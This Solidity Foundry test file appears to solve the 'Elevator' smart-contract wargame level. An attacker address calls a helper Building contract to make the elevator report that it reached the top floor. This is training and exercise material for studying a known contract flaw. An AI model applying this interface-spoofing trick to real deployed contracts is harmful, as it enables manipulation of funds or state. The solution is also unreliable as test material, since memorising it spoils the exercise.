// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/Elevator/Level.sol";
import "../utils/Buildling.sol";
import "forge-std/console.sol";

interface IElevator {
    function goTo(uint _floor) external;

    function top() external view returns(bool);
}

contract ElevatorTest is Test {
    IElevator elevator;
    Building building;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        console.log(deployer, attacker);
        vm.prank(deployer); // deploy the contract as deployer
        elevator = IElevator(address(new Elevator()));
        building = Building(address(new TheBuilding()));
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        address(building).call(abi.encodeWithSignature("goTo(address,uint256)", address(elevator), 1));
        /* Write your code here */ 

        /* Validating the test */
        assertTrue(elevator.top());
    }

}


